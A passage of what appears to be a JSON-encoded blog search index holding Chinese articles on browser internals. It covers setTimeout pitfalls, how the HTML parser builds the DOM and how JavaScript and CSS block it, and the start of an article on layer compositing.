kMaxTimerNestingLevel)</span><br><span class=\"line\">    interval_milliseconds = kMinimumInterval;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (single_shot)</span><br><span class=\"line\">    <span class=\"built_in\">StartOneShot</span>(interval_milliseconds, FROM_HERE);</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">    <span class=\"built_in\">StartRepeating</span>(interval_milliseconds, FROM_HERE);</span><br></pre></td></tr></tbody></table></figure>\n\n<p>所以，一些实时性较高的需求就不太适合使用 setTimeout 了，比如你用 setTimeout 来实现 JavaScript 动画就不是一个很好的主意。</p>\n<h3 id=\"3-未激活的页面，setTimeout执行最小间隔是1000毫秒\"><a href=\"#3-未激活的页面，setTimeout执行最小间隔是1000毫秒\" class=\"headerlink\" title=\"3. 未激活的页面，setTimeout执行最小间隔是1000毫秒\"></a>3. 未激活的页面，setTimeout 执行最小间隔是 1000 毫秒</h3><p>除了前面的 4 毫秒延迟，还有一个很容易被忽略的地方，那就是未被激活的页面中定时器最小值大于 1000 毫秒，也就是说，如果标签不是当前的激活标签，那么定时器最小的时间间隔是 1000 毫秒，目的是为了优化后台页面的加载损耗以及降低耗电量。这一点你在使用定时器的时候要注意。</p>\n<h3 id=\"4-延时执行时间有最大值\"><a href=\"#4-延时执行时间有最大值\" class=\"headerlink\" title=\"4. 延时执行时间有最大值\"></a>4. 延时执行时间有最大值</h3><p>除了要了解定时器的回调函数时间比实际设定值要延后之外，还有一点需要注意下，那就是 Chrome、Safari、Firefox 都是以 32 个 bit 来存储延时值的，32bit 最大只能存放的数字是 2147483647 毫秒，这就意味着，如果 setTimeout 设置的延迟值大于 2147483647 毫秒（大约 24.8 天）时就会溢出，那么相当于延时值被设置为 0 了，这导致定时器会被立即执行。你可以运行下面这段代码：</p>\n<figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">showName</span>(<span class=\"params\"></span>){</span><br><span class=\"line\">  <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">\"极客时间\"</span>)</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"keyword\">var</span> timerID = <span class=\"built_in\">setTimeout</span>(showName,<span class=\"number\">2147483648</span>);<span class=\"comment\">//会被理解调用执行</span></span><br></pre></td></tr></tbody></table></figure>\n\n<p>运行后可以看到，这段代码是立即被执行的。但如果将延时值修改为小于 2147483647 毫秒的某个值，那么执行时就没有问题了。</p>\n<h3 id=\"5-使用setTimeout设置的回调函数中的this不符合直觉\"><a href=\"#5-使用setTimeout设置的回调函数中的this不符合直觉\" class=\"headerlink\" title=\"5. 使用setTimeout设置的回调函数中的this不符合直觉\"></a>5. 使用 setTimeout 设置的回调函数中的 this 不符合直觉</h3><p>如果被 setTimeout 推迟执行的回调函数是某个对象的方法，那么该方法中的 this 关键字将指向全局环境，而不是定义时所在的那个对象。这点在前面介绍 this 的时候也提过，你可以看下面这段代码的执行结果：</p>\n<figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> name= <span class=\"number\">1</span>;</span><br><span class=\"line\"><span class=\"keyword\">var</span> <span class=\"title class_\">MyObj</span> = {</span><br><span class=\"line\">  <span class=\"attr\">name</span>: <span class=\"number\">2</span>,</span><br><span class=\"line\">  <span class=\"attr\">showName</span>: <span class=\"keyword\">function</span>(<span class=\"params\"></span>){</span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"variable language_\">this</span>.<span class=\"property\">name</span>);</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"built_in\">setTimeout</span>(<span class=\"title class_\">MyObj</span>.<span class=\"property\">showName</span>,<span class=\"number\">1000</span>)</span><br></pre></td></tr></tbody></table></figure>\n\n<p>这里输出的是 1，因为这段代码在编译的时候，执行上下文中的 this 会被设置为全局 window，如果是严格模式，会被设置为 undefined。</p>\n<p>那么该怎么解决这个问题呢？通常可以使用下面这两种方法。</p>\n<p>第一种是将 <code>MyObj.showName</code> 放在匿名函数中执行，如下所示：</p>\n<figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//箭头函数</span></span><br><span class=\"line\"><span class=\"built_in\">setTimeout</span>(<span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">    <span class=\"title class_\">MyObj</span>.<span class=\"title function_\">showName</span>()</span><br><span class=\"line\">}, <span class=\"number\">1000</span>);</span><br><span class=\"line\"><span class=\"comment\">//或者function函数</span></span><br><span class=\"line\"><span class=\"built_in\">setTimeout</span>(<span class=\"keyword\">function</span>(<span class=\"params\"></span>) {</span><br><span class=\"line\">  <span class=\"title class_\">MyObj</span>.<span class=\"title function_\">showName</span>();</span><br><span class=\"line\">}, <span class=\"number\">1000</span>)</span><br></pre></td></tr></tbody></table></figure>\n\n<p>第二种是使用 bind 方法，将 showName 绑定在 MyObj 上面，代码如下所示：</p>\n<figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">setTimeout</span>(<span class=\"title class_\">MyObj</span>.<span class=\"property\">showName</span>.<span class=\"title function_\">bind</span>(<span class=\"title class_\">MyObj</span>), <span class=\"number\">1000</span>)</span><br></pre></td></tr></tbody></table></figure>\n\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>好了，今天我们就介绍到这里，下面我来总结下今天的内容。</p>\n<ul>\n<li>首先，为了支持定时器的实现，浏览器增加了延时队列。</li>\n<li>其次，由于消息队列排队和一些系统级别的限制，通过 setTimeout 设置的回调任务并非总是可以实时地被执行，这样就不能满足一些实时性要求较高的需求了。</li>\n<li>最后，在定时器中使用过程中，还存在一些陷阱，需要你多加注意。<br>通过分析和讲解，你会发现函数 setTimeout 在时效性上面有很多先天的不足，所以对于一些时间精度要求比较高的需求，应该有针对性地采取一些其他的方案。</li>\n</ul>\n"},{"title":"DOM 树：JavaScript 是如何影响 DOM 树构建的？","url":"/browser/pages/DOMTree.html","content":"<h2 id=\"什么是DOM\"><a href=\"#什么是DOM\" class=\"headerlink\" title=\"什么是DOM\"></a>什么是 DOM</h2><p>从网络传给渲染引擎的 HTML 文件字节流是无法直接被渲染引擎理解的，所以要将其转化为渲染引擎能够理解的内部结构，这个结构就是 DOM。DOM 提供了对 HTML 文档结构化的表述。在渲染引擎中，DOM 有三个层面的作用。</p>\n<ul>\n<li>从页面的视角来看，DOM 是生成页面的基础数据结构。</li>\n<li>从 JavaScript 脚本视角来看，DOM 提供给 JavaScript 脚本操作的接口，通过这套接口，JavaScript 可以对 DOM 结构进行访问，从而改变文档的结构、样式和内容。</li>\n<li>从安全视角来看，DOM 是一道安全防护线，一些不安全的内容在 DOM 解析阶段就被拒之门外了。<br>简言之，DOM 是表述 HTML 的内部数据结构，它会将 Web 页面和 JavaScript 脚本连接起来，并过滤一些不安全的内容。</li>\n</ul>\n<h2 id=\"DOM树如何生成\"><a href=\"#DOM树如何生成\" class=\"headerlink\" title=\"DOM树如何生成\"></a>DOM 树如何生成</h2><p>在渲染引擎内部，有一个叫 <strong>HTML 解析器（HTMLParser）</strong>的模块，它的职责就是负责将 HTML 字节流转换为 DOM 结构。所以这里我们需要先要搞清楚 HTML 解析器是怎么工作的。</p>\n<p>前面我们说过代码从网络传输过来是字节流的形式，那么后续字节流是如何转换为 DOM 的呢？你可以参考下图：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/6639f8c70ea9cb140380a1a3.png\" alt=\"字节流转换为DOM\"></p>\n<p>从图中你可以看出，字节流转换为 DOM 需要三个阶段</p>\n<p><strong>第一阶段，通过分词器将字节流转换为 Token</strong>。</p>\n<p>前面<a href=\"/browser/v8/CompilerInterpreter.html\">《编译器和解释器：V8 是如何执行一段 JavaScript 代码的？》</a>文章中我们介绍过，V8 编译 JavaScript 过程中的第一步是做词法分析，将 JavaScript 先分解为一个个 Token。解析 HTML 也是一样的，需要通过分词器先将字节流转换为一个个 Token，分为 Tag Token 和文本 Token。上述 HTML 代码通过词法分析生成的 Token 如下所示：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/6639f93c0ea9cb1403812eea.png\" alt=\"生成的Token示意图\"></p>\n<p>由图可以看出，Tag Token 又分 StartTag 和 EndTag，比如 <code>&lt;body&gt;</code> 就是 StartTag ，<code>&lt;/body&gt;</code> 就是 EndTag，分别对于图中的蓝色和红色块，文本 Token 对应的绿色块。</p>\n<p><strong>至于后续的第二个和第三个阶段是同步进行的，需要将 Token 解析为 DOM 节点，并将 DOM 节点添加到 DOM 树中</strong>。</p>\n<p>HTML 解析器维护了一个 <strong>Token 栈结构</strong>，该 Token 栈主要用来计算节点之间的父子关系，在第一个阶段中生成的 Token 会被按照顺序压到这个栈中。具体的处理规则如下所示：</p>\n<ul>\n<li>如果压入到栈中的是 <strong>StartTag Token</strong>，HTML 解析器会为该 Token 创建一个 <strong>DOM 节点</strong>，然后将该节点加入到 DOM 树中，它的父节点就是栈中相邻的那个元素生成的节点。</li>\n<li>如果分词器解析出来是<strong>文本 Token</strong>，那么会生成一个文本节点，然后将该节点加入到 DOM 树中，文本 Token 是不需要压入到栈中，它的<strong>父节点</strong>就是当前栈顶 Token 所对应的 <strong>DOM 节点</strong>。</li>\n<li>如果分词器解析出来的是 EndTag 标签，比如是 EndTag <code>div</code>，HTML 解析器会查看 Token 栈顶的元素是否是 StarTag <code>div</code>，如果是，就将 StartTag <code>div</code> 从栈中弹出，表示该 <code>div</code> 元素解析完成。</li>\n</ul>\n<p>通过分词器产生的新 Token 就这样不停地压栈和出栈，整个解析过程就这样一直持续下去，直到分词器将所有字节流分词完成。</p>\n<p>为了更加直观地理解整个过程，下面我们结合一段 HTML 代码（如下），来一步步分析 DOM 树的生成过程。</p>\n<figure class=\"highlight html\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span>1<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span>test<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>\n\n<p>这段代码以字节流的形式传给了 HTML 解析器，经过分词器处理，解析出来的第一个 Token 是 StartTag <code>html</code>，解析出来的 Token 会被压入到栈中，并同时创建一个 <code>html</code> 的 DOM 节点，将其加入到 DOM 树中。</p>\n<p>这里需要补充说明下，<strong>HTML 解析器开始工作时，会默认创建了一个根为 document 的空 DOM 结构</strong>，同时会将一个 StartTag document 的 Token 压入栈底。然后经过分词器解析出来的第一个 <code>StartTag html</code> Token 会被压入到栈中，并创建一个 <code>html</code> 的 DOM 节点，添加到 document 上，如下图所示：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/6639fa750ea9cb140382c522.png\" alt=\"解析到StartTag html时的状态\"></p>\n<p>然后按照同样的流程解析出来 <code>StartTag body</code> 和 <code>StartTag div</code>，其 Token 栈和 DOM 的状态如下图所示：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/6639faa90ea9cb1403830747.png\" alt=\"解析到StartTag div时的状态\"></p>\n<p>接下来解析出来的是第一个 div 的文本 Token，渲染引擎会为该 Token 创建一个文本节点，并将该 Token 添加到 DOM 中，它的父节点就是当前 Token 栈顶元素对应的节点，如下图所示：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/6639fae60ea9cb1403834f3e.png\" alt=\"解析出第一个文本Token时的状态\"></p>\n<p>再接下来，分词器解析出来第一个 <code>EndTag div</code>，这时候 HTML 解析器会去判断当前栈顶的元素是否是 <code>StartTag div</code>，如果是则从栈顶弹出 <code>StartTag div</code>，如下图所示：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/6639fb130ea9cb1403837f69.png\" alt=\"元素弹出Token栈示意图\"></p>\n<p>按照同样的规则，一路解析，最终结果如下图所示：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/6639fb320ea9cb140383a5b4.png\" alt=\"最终解析结果\"></p>\n<p>通过上面的介绍，相信你已经清楚 DOM 是怎么生成的了。不过在实际生产环境中，HTML 源文件中既包含 CSS 和 JavaScript，又包含图片、音频、视频等文件，所以处理过程远比上面这个示范 Demo 复杂。不过理解了这个简单的 Demo 生成过程，我们就可以往下分析更加复杂的场景了。</p>\n<h2 id=\"JavaScript是如何影响DOM生成的\"><a href=\"#JavaScript是如何影响DOM生成的\" class=\"headerlink\" title=\"JavaScript是如何影响DOM生成的\"></a>JavaScript 是如何影响 DOM 生成的</h2><p>我们再来看看稍微复杂点的 HTML 文件，如下所示：</p>\n<figure class=\"highlight html\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span>1<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-javascript\"></span></span><br><span class=\"line\"><span class=\"language-javascript\">    <span class=\"keyword\">let</span> div1 = <span class=\"variable language_\">document</span>.<span class=\"title function_\">getElementsByTagName</span>(<span class=\"string\">'div'</span>)[<span class=\"number\">0</span>]</span></span><br><span class=\"line\"><span class=\"language-javascript\">    div1.<span class=\"property\">innerText</span> = <span class=\"string\">'time.geekbang'</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">    </span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span>test<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>\n\n<p>我在两段 div 中间插入了一段 JavaScript 脚本，这段脚本的解析过程就有点不一样了。<code>&lt;script&gt;</code> 标签之前，所有的解析流程还是和之前介绍的一样，但是解析到 <code>&lt;script&gt;</code> 标签时，渲染引擎判断这是一段脚本，此时 HTML 解析器就会暂停 DOM 的解析，因为接下来的 JavaScript 可能要修改当前已经生成的 DOM 结构。</p>\n<p>通过前面 DOM 生成流程分析，我们已经知道当解析到 script 脚本标签时，其 DOM 树结构如下所示：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/6639fbe10ea9cb1403855aed.png\" alt=\"执行脚本时DOM的状态\"></p>\n<p>这时候 HTML 解析器暂停工作，JavaScript 引擎介入，并执行 script 标签中的这段脚本，因为这段 JavaScript 脚本修改了 DOM 中第一个 div 中的内容，所以执行这段脚本之后，div 节点内容已经修改为 <code>time.geekbang</code> 了。脚本执行完成之后，HTML 解析器恢复解析过程，继续解析后续的内容，直至生成最终的 DOM。</p>\n<p>以上过程应该还是比较好理解的，不过除了在页面中直接内嵌 JavaScript 脚本之外，我们还通常需要在页面中引入 JavaScript 文件，这个解析过程就稍微复杂了些，如下面代码：</p>\n<figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//foo.js</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> div1 = <span class=\"variable language_\">document</span>.<span class=\"title function_\">getElementsByTagName</span>(<span class=\"string\">'div'</span>)[<span class=\"number\">0</span>]</span><br><span class=\"line\">div1.<span class=\"property\">innerText</span> = <span class=\"string\">'time.geekbang'</span></span><br></pre></td></tr></tbody></table></figure>\n\n<figure class=\"highlight html\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span>1<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">type</span>=<span class=\"string\">\"text/javascript\"</span> <span class=\"attr\">src</span>=<span class=\"string\">'foo.js'</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span>test<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>\n\n<p>这段代码的功能还是和前面那段代码是一样的，不过这里我把内嵌 JavaScript 脚本修改成了通过 JavaScript 文件加载。其整个执行流程还是一样的，执行到 JavaScript 标签时，暂停整个 DOM 的解析，执行 JavaScript 代码，不过这里执行 JavaScript 时，需要先<strong>下载</strong>这段 JavaScript 代码。这里需要重点关注下载环境，因为 <strong>JavaScript 文件的下载过程会阻塞 DOM 解析</strong>，而通常下载又是非常耗时的，会受到网络环境、JavaScript 文件大小等因素的影响。</p>\n<p>不过 Chrome 浏览器做了很多优化，其中一个主要的优化是预<strong>解析操作</strong>。当渲染引擎收到字节流之后，会开启一个预解析线程，用来分析 HTML 文件中包含的 JavaScript、CSS 等相关文件，解析到相关文件之后，预解析线程会提前下载这些文件。</p>\n<p>再回到 DOM 解析上，我们知道引入 JavaScript 线程会阻塞 DOM，不过也有一些相关的策略来规避，比如使用 CDN 来加速 JavaScript 文件的加载，压缩 JavaScript 文件的体积。另外，如果 JavaScript 文件中没有操作 DOM 相关代码，就可以将该 JavaScript 脚本设置为异步加载，通过 async 或 defer 来标记代码，使用方式如下所示：</p>\n<figure class=\"highlight html\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">async</span> <span class=\"attr\">type</span>=<span class=\"string\">\"text/javascript\"</span> <span class=\"attr\">src</span>=<span class=\"string\">'foo.js'</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>\n\n<figure class=\"highlight html\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">defer</span> <span class=\"attr\">type</span>=<span class=\"string\">\"text/javascript\"</span> <span class=\"attr\">src</span>=<span class=\"string\">'foo.js'</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>\n\n<p>async 和 defer 虽然都是异步的，不过还有一些差异，使用 async 标志的脚本文件一旦加载完成，会立即执行；而使用了 defer 标记的脚本文件，需要在 DOMContentLoaded 事件之前执行。</p>\n<p>现在我们知道了 JavaScript 是如何阻塞 DOM 解析的了，那接下来我们再来结合文中代码看看另外一种情况：</p>\n<figure class=\"highlight css\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">//theme<span class=\"selector-class\">.css</span></span><br><span class=\"line\"><span class=\"selector-tag\">div</span> {<span class=\"attribute\">color</span>:blue}</span><br></pre></td></tr></tbody></table></figure>\n\n<figure class=\"highlight html\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">style</span> <span class=\"attr\">src</span>=<span class=\"string\">'theme.css'</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">style</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span>1<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-javascript\"></span></span><br><span class=\"line\"><span class=\"language-javascript\">            <span class=\"keyword\">let</span> div1 = <span class=\"variable language_\">document</span>.<span class=\"title function_\">getElementsByTagName</span>(<span class=\"string\">'div'</span>)[<span class=\"number\">0</span>]</span></span><br><span class=\"line\"><span class=\"language-javascript\">            div1.<span class=\"property\">innerText</span> = <span class=\"string\">'time.geekbang'</span> <span class=\"comment\">//需要DOM</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">            div1.<span class=\"property\">style</span>.<span class=\"property\">color</span> = <span class=\"string\">'red'</span>  <span class=\"comment\">//需要CSSOM</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">        </span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span>test<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>\n\n<p>该示例中，JavaScript 代码出现了 <code>div1.style.color = 'red'</code> 的语句，它是用来操纵 CSSOM 的，所以在执行 JavaScript 之前，需要先解析 JavaScript 语句之上所有的 CSS 样式。所以如果代码里引用了外部的 CSS 文件，那么在执行 JavaScript 之前，还需要等待外部的 CSS 文件下载完成，并解析生成 CSSOM 对象之后，才能执行 JavaScript 脚本。</p>\n<p>而 JavaScript 引擎在解析 JavaScript 之前，是不知道 JavaScript 是否操纵了 CSSOM 的，所以渲染引擎在遇到 JavaScript 脚本时，不管该脚本是否操纵了 CSSOM，都会执行 CSS 文件下载，解析操作，再执行 JavaScript 脚本。</p>\n<p>所以说 JavaScript 脚本是依赖样式表的，这又多了一个阻塞过程。至于如何优化，我们在下篇文章中再来深入探讨。</p>\n<p>通过上面的分析，我们知道了 JavaScript 会阻塞 DOM 生成，而样式文件又会阻塞 JavaScript 的执行，所以在实际的工程中需要重点关注 JavaScript 文件和样式表文件，使用不当会影响到页面性能的。</p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>好了，今天就讲到这里，下面我来总结下今天的内容。</p>\n<p>首先我们介绍了 DOM 是如何生成的，然后又基于 DOM 的生成过程分析了 JavaScript 是如何影响到 DOM 生成的。因为 CSS 和 JavaScript 都会影响到 DOM 的生成，所以我们又介绍了一些加速生成 DOM 的方案，理解了这些，能让你更加深刻地理解如何去优化首次页面渲染。</p>\n<p>额外说明一下，渲染引擎还有一个安全检查模块叫 XSSAuditor，是用来检测词法安全的。在分词器解析出来 Token 之后，它会检测这些模块是否安全，比如是否引用了外部脚本，是否符合 CSP 规范，是否存在跨站点请求等。如果出现不符合规范的内容，XSSAuditor 会对该脚本或者下载任务进行拦截。详细内容我们会在后面的安全模块介绍，这里就不赘述了。</p>\n<h2 id=\"课外作业\"><a href=\"#课外作业\" class=\"headerlink\" title=\"课外作业\"></a>课外作业</h2><p>看下面这样一段代码，你认为打开这个 HTML 页面，页面显示的内容是什么？</p>\n<figure class=\"highlight html\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span>1<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-javascript\"></span></span><br><span class=\"line\"><span class=\"language-javascript\">    <span class=\"keyword\">let</span> div1 = <span class=\"variable language_\">document</span>.<span class=\"title function_\">getElementsByTagName</span>(<span class=\"string\">'div'</span>)[<span class=\"number\">0</span>]</span></span><br><span class=\"line\"><span class=\"language-javascript\">    div1.<span class=\"property\">innerText</span> = <span class=\"string\">'time.geekbang'</span></span></span><br><span class=\"line\"><span class=\"language-javascript\"></span></span><br><span class=\"line\"><span class=\"language-javascript\">    <span class=\"keyword\">let</span> div2 = <span class=\"variable language_\">document</span>.<span class=\"title function_\">getElementsByTagName</span>(<span class=\"string\">'div'</span>)[<span class=\"number\">1</span>]</span></span><br><span class=\"line\"><span class=\"language-javascript\">    div2.<span class=\"property\">innerText</span> = <span class=\"string\">'time.geekbang.com'</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">    </span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span>test<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>\n\n<p>欢迎在留言区与我分享你的想法，也欢迎你在留言区记录你的思考过程。感谢阅读，如果你觉得这篇文章对你有帮助的话，也欢迎把它分享给更多的朋友。</p>\n"},{"title":"分层和合成机制：为什么 CSS 动画比 JavaScript 高效？","url":"/browser/pages/LayeAndSynMecha.html","content":"<p>在上一篇文章中我们分析了 CSS 和 JavaScript 是如何影响到 DOM 树生成的，今天我们继续沿着渲染流水线向下分析，来聊聊 DOM 树之后所发生的事情。</p>\n<p>在前面《<a href=\"/browser/protocol/http-navigation.html\">渲染流程</a>》文章中，我们介绍过 DOM 树生成之后，还要经历布局、分层、绘制、合成、显示等阶段后才能显示出漂亮的页面。</p>\n<p>本文我们主要讲解渲染引擎的分层和合成机制，因为分层和合成机制代表了浏览器最为先进的合成技术，Chrome 团队为了做到这一点，做了大量的优化工作。了解其工作原理，有助于拓宽你的视野，而且也有助于你更加深刻地理解 CSS 动画和 JavaScript 底层工作机制。</p>\n<h2 id=\"显示器是怎么显示图像的\"><a href=\"#显示器是怎么显示图像的\" class=\"headerlink\" title=\"显示器是怎么显示图像的\"></a>显示器是怎么显示图像的</h2><p>每个显示器都有固定的刷新频率，通常是 60HZ，也就是每秒更新 60 张图片，更新的图片都来自于显卡中一个叫<strong>前缓冲区</strong>的地方，显示器所做的任务很简单，就是每秒固定读取 60 次前缓冲区中的图像，并将读取的图像显示到显示器上。</p>\n<p><strong>那么这里显卡做什么呢？</strong></p>\n<p>显卡的职责就是合成新的图像，并将图像保存到<strong>后缓冲区</strong>中，一旦显卡把合成的图像写到后缓冲区，系统就会让后缓冲区和前缓冲区互换，这样就能保证显示器能读取到最新显卡合成的图像。通常情况下，显卡的更新频率和显示器的刷新频率是一致的。但有时候，在一些复杂的场景中，显卡处理一张图片的速度会变慢，这样就会造成视觉上的卡顿。</p>\n<h2 id=\"帧-VS-帧率\"><a href=\"#帧-VS-帧率\" class=\"headerlink\" title=\"帧 VS 帧率\"></a>帧 VS 帧率</h2><p>了解了显示器是怎么显示图像的之后，下面我们再来明确下帧和帧率的概念，因为这是后续一切分析的基础。</p>\n<p>当你通过滚动条滚动页面，或者通过手势缩放页面时，屏幕上就会产生动画的效果。之所以你能感觉到有动画的效果，是因为在滚动或者缩放操作时，渲染引擎会通过渲染流水线生成新的图片，并发送到显卡的后缓冲区。</p>\n<p>大多数设备屏幕的更新频率是 60 次 / 秒，这也就意味着正常情况下要实现流畅的动画效果，渲染引擎需要每秒更新 60 张图片到显卡的后缓冲区。</p>\n<p>我们把渲染流水线生成的每一副图片称为一帧，把渲染流水线每秒更新了多少帧称为帧率，比如滚动过程中 1 秒更新了 60 帧，那么帧率就是 60Hz（或者 60FPS）。</p>\n<p>由于用户很容易观察到那些丢失的帧，如果在一次动画过程中，渲染引擎生成某些帧的时间过久，那么用户就会感受到卡顿，这会给用户造成非常不好的印象。</p>\n<p>要解决卡顿问题，就要解决每帧生成时间过久的问题，为此 Chrome 对浏览器渲染方式做了大量的工作，其中最卓有成效的策略就是引入了分层和合成机制。分层和合成机制代表了当今最先进的渲染技术，所以接下来我们就来分析下什么是合成和渲染技术。</p>\n<h2 id=\"如何生成一帧图像\"><a href=\"#如何生成一帧图像\" class=\"headerlink\" title=\"如何生成一帧图像\"></a>如何生成一帧图像</h2><p>不过在开始之前，我们还需要聊一聊渲染引擎是如何生成一帧图像的。这需要回顾下我们前面《<a href=\"/browser/protocol/http-navigation.html\">渲染流程</a>》介绍的渲染流水线。关于其中任意一帧的生成方式，有<strong>重排、重绘和合成</strong>三种方式。</p>\n<p>这三种方式的渲染路径是不同的，通常渲染路径越长，生成图像花费的时间就越多。比如重排，它需要重新根据 CSSOM 和 DOM 